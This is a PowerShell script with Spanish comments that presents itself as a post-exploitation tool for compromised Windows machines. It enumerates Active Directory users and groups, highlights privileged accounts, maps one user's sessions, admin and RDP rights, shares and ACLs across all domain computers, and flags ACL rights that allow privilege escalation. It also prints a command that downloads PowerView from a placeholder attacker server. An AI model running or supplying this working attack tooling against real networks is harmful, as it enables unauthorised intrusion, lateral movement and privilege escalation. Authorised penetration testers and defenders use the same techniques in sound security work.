<#
.SYNOPSIS
    ADEnum-Extended.ps1 - Script modular de enumeración Active Directory
.DESCRIPTION
    Este script combina enumeración basada en .NET con funcionalidades extendidas vía PowerView (si está presente).
    Ideal para post-explotación en máquinas comprometidas, sin dependencias externas por defecto.
    Autor: duckman_42 (mejorado con ideas de ChatGPT)
#>

param (
    [switch]$Help
)

if ($Help) {
    Write-Host "`n[?] Uso del script ADEnum-Extended.ps1:" -ForegroundColor Cyan
    Write-Host @"
Comandos disponibles:
  Enum-ADUsers [-ExpandGroups] [-HighlightCritical]     → Enumera usuarios
  Enum-ADGroups [-ExpandUsers] [-HighlightCritical]     → Enumera grupos
  Enum-ADCritical                                        → Enumera objetos críticos
  Enum-ADRelationships                                   → Enumera relaciones usuario ↔ grupo
  Get-GroupUserChain -GroupName "Admins"                → Cadena de pertenencia recursiva
  Enum-ADUserDeepRecon -UserName "jdoe"                 → Análisis profundo de un usuario (requiere PowerView)
  Enum-ADObjectPermissions -TargetName "jdoe"           → Enumera ACLs y privilegios sobre un objeto AD
"@
    return
}

# =================== Importar PowerView si está presente =====================

$PowerViewAvailable = $false
if (Get-Command Get-DomainUser -ErrorAction SilentlyContinue) {
    $PowerViewAvailable = $true
} elseif (Test-Path ".\PowerView.ps1") {
    Import-Module .\PowerView.ps1 -ErrorAction SilentlyContinue
    if (Get-Command Get-DomainUser -ErrorAction SilentlyContinue) {
        $PowerViewAvailable = $true
    }
}

# =================== Funciones Base (del Script 1) ==========================

function Invoke-LDAPQuery {
    param (
        [Parameter(Mandatory = $true)]
        [string]$LDAPFilter,

        [string[]]$PropertiesToLoad = @("samaccountname", "name", "memberof", "member"),

        [switch]$ExpandRelationships,
        [switch]$HighlightCritical
    )

    $criticalUsers = @("Administrator", "krbtgt")
    $criticalGroups = @("Domain Admins", "Enterprise Admins", "Administrators")

    try {
        $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
        $DN = ([ADSI]'').distinguishedName
        $LDAP = "LDAP://$PDC/$DN"

        $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry)
        $Searcher.Filter = $LDAPFilter
        $Searcher.PageSize = 1000

        foreach ($prop in $PropertiesToLoad) {
            $Searcher.PropertiesToLoad.Add($prop) | Out-Null
        }

        $Results = $Searcher.FindAll()

        foreach ($entry in $Results) {
            $props = $entry.Properties
            $name = $props["name"] -join ", "
            $sam = $props["samaccountname"] -join ", "
            $memberof = @()
            $members = @()

            if ($ExpandRelationships -and $props["memberof"]) {
                foreach ($dn in $props["memberof"]) {
                    try { $memberof += ([ADSI]"LDAP://$dn").cn } catch { $memberof += $dn }
                }
            }

            if ($ExpandRelationships -and $props["member"]) {
                foreach ($dn in $props["member"]) {
                    try { $members += ([ADSI]"LDAP://$dn").samaccountname } catch { $members += $dn }
                }
            }

            $isCriticalUser = $HighlightCritical -and ($criticalUsers -contains $sam)
            $isCriticalGroup = $HighlightCritical -and ($criticalGroups -contains $name)

            if ($isCriticalUser -or $isCriticalGroup) {
                Write-Host "`n[$sam] ($name)" -ForegroundColor Red
            } else {
                Write-Host "`n[$sam] ($name)" -ForegroundColor Cyan
            }

            if ($memberof.Count -gt 0) {
                Write-Host "  ➤ Miembro de: $($memberof -join ', ')" -ForegroundColor Yellow
            }

            if ($members.Count -gt 0) {
                Write-Host "  ➤ Miembros del grupo: $($members -join ', ')" -ForegroundColor Green
            }
        }
    } catch {
        Write-Warning "Error realizando la búsqueda LDAP: $_"
    }
}

function Enum-ADUsers {
    param (
        [switch]$ExpandGroups,
        [switch]$HighlightCritical
    )
    Invoke-LDAPQuery -LDAPFilter "(&(objectCategory=person)(objectClass=user))" -ExpandRelationships:$ExpandGroups -HighlightCritical:$HighlightCritical
}

function Enum-ADGroups {
    param (
        [switch]$ExpandUsers,
        [switch]$HighlightCritical
    )
    Invoke-LDAPQuery -LDAPFilter "(objectClass=group)" -ExpandRelationships:$ExpandUsers -HighlightCritical:$HighlightCritical
}

function Enum-ADCritical {
    Enum-ADUsers -ExpandGroups -HighlightCritical
    Enum-ADGroups -ExpandUsers -HighlightCritical
}

function Enum-ADRelationships {
    Write-Host "\nRelaciones Usuario → Grupos:`n" -ForegroundColor Magenta
    Invoke-LDAPQuery -LDAPFilter "(&(objectCategory=person)(objectClass=user))" -ExpandRelationships

    Write-Host "\nRelaciones Grupo → Miembros:`n" -ForegroundColor Magenta
    Invoke-LDAPQuery -LDAPFilter "(objectClass=group)" -ExpandRelationships
}

function Get-GroupUserChain {
    param (
        [string]$GroupName,
        [int]$Depth = 0
    )
    $indent = ('  ' * $Depth) + '↳ '
    $group = [ADSI]"LDAP://CN=$GroupName,CN=Users,DC=corp,DC=com"
    if (-not $group) { return }

    $members = $group.member
    if (-not $members) {
        Write-Host "$indent $GroupName (sin miembros)" -ForegroundColor Yellow
        return
    }

    Write-Host "$indent $GroupName" -ForegroundColor Cyan

    foreach ($memberDN in $members) {
        $member = [ADSI]"LDAP://$memberDN"
        $objectClass = $member.objectClass

        if ($objectClass -contains "group") {
            Get-GroupUserChain -GroupName $member.cn -Depth ($Depth + 1)
        }
        elseif ($objectClass -contains "user") {
            Write-Host ('  ' * ($Depth + 1)) + "↳ $($member.cn)" -ForegroundColor Green
        }
    }
}

# =================== Función Extendida (PowerView) ==========================

function Enum-ADUserDeepRecon {
    param (
        [Parameter(Mandatory = $true)]
        [string]$UserName
    )

    if (-not $PowerViewAvailable) {
        Write-Warning "PowerView no está disponible. Puedes descargarlo así:"
        Write-Host "iwr -uri http://<tu-servidor>/PowerView.ps1 -OutFile PowerView.ps1" -ForegroundColor Cyan
        return
    }

    Write-Host "[*] Grupos del usuario ${UserName}:" -ForegroundColor Cyan
    Get-DomainUser -Identity $UserName -Properties memberof | Select-Object -ExpandProperty memberof

    Write-Host "[*] Enumerando privilegios, sesiones y shares de ${UserName}..." -ForegroundColor Cyan
    $computers = Get-DomainComputer | Select-Object -ExpandProperty Name
    $results = @()

    foreach ($computer in $computers) {
        $isAdmin = $false
        $isRDP = $false
        $hasSessions = $false
        $shareList = @()
        $aclPerms = @()

        try {
            $sessions = Get-NetSession -ComputerName $computer -ErrorAction Stop
            foreach ($session in $sessions) {
                if ($session.UserName -like "*${UserName}*") { $hasSessions = $true }
            }
        } catch {}

        try {
            $admins = Get-NetLocalGroup -ComputerName $computer -GroupName "Administrators" -ErrorAction Stop
            foreach ($admin in $admins) {
                if ($admin.MemberName -like "*${UserName}*") { $isAdmin = $true }
            }
        } catch {}

        try {
            $rdp = Get-NetLocalGroup -ComputerName $computer -GroupName "Remote Desktop Users" -ErrorAction Stop
            foreach ($member in $rdp) {
                if ($member.MemberName -like "*${UserName}*") { $isRDP = $true }
            }
        } catch {}

        try {
            $shares = Invoke-ShareFinder -ComputerName $computer -CheckShareAccess -Verbose:$false 2>$null
            if ($shares) {
                $shareList = $shares | Where-Object { $_.Accessible -eq $true } | Select-Object -ExpandProperty Name
            }
        } catch {}

        try {
            $acls = Invoke-ACLScanner -ResolveGUIDs -ComputerName $computer -ErrorAction Stop
            $userACLs = $acls | Where-Object { $_.IdentityReference -like "*${UserName}*" }
            foreach ($acl in $userACLs) {
                $aclPerms += $acl.FileSystemRights
            }
        } catch {}

        $results += [PSCustomObject]@{
            Computer = $computer
            HasSession = $hasSessions
            IsAdmin = $isAdmin
            IsRDPUser = $isRDP
            Shares = ($shareList -join ", ")
            ACLPermissions = ($aclPerms -join ", ")
        }
    }

    Write-Host "`n[*] Resumen por máquina para ${UserName}:" -ForegroundColor Cyan
    $results | Format-Table -AutoSize
}

function Enum-ADObjectPermissions {
    param(
        [string]$TargetName
    )

    Write-Host "[*] Enumerando permisos (ACLs/ACEs) sobre el objeto: $TargetName" -ForegroundColor Cyan

    try {
        # Intentar obtener el objeto como usuario o grupo
        $user = Get-ADUser -Identity $TargetName -ErrorAction SilentlyContinue
        if (-not $user) {
            $user = Get-ADGroup -Identity $TargetName -ErrorAction SilentlyContinue
        }
        if (-not $user) {
            Write-Warning "El objeto $TargetName no se encontró como usuario ni como grupo."
            return
        }

        # Obtener el objeto AD con el descriptor de seguridad
        $obj = Get-ADObject -Identity $user.DistinguishedName -Properties nTSecurityDescriptor

        # Verificar si el objeto tiene un descriptor de seguridad
        if (-not $obj.nTSecurityDescriptor) {
            Write-Warning "El objeto $TargetName no tiene un descriptor de seguridad (nTSecurityDescriptor)."
            return
        }

        # Obtener los ACLs/ACEs
        $acls = $obj.nTSecurityDescriptor.DiscretionaryAcl

        $results = foreach ($ace in $acls) {
            $trustee = try {
                (New-Object System.Security.Principal.SecurityIdentifier($ace.SecurityIdentifier)).Translate([System.Security.Principal.NTAccount])
            } catch {
                $ace.SecurityIdentifier.Value
            }

            [PSCustomObject]@{
                Identity = $trustee
                Rights   = $ace.ActiveDirectoryRights
                Type     = $ace.AccessControlType
            }
        }

        # Resaltar permisos peligrosos (puedes personalizar las reglas de resaltado)
        $results | ForEach-Object {
            $color = "White"
            if ($_.Rights -match "GenericAll|WriteDacl|WriteOwner|Self|AllExtendedRights|ExtendedRight") {
                $color = "Yellow"
            }
            if ($_.Rights -match "ForceChangePassword|GenericAll") {
                $color = "Red"
            }

            Write-Host "$($_.Identity) => $($_.Rights) [$($_.Type)]" -ForegroundColor $color
        }

    } catch {
        Write-Error "Error al intentar enumerar permisos: $_"
    }
}



# =================== Mensaje de carga ==========================

Write-Host "`n[+] ADEnum-Extended.ps1 cargado. Usa -Help para ver instrucciones." -ForegroundColor Gray
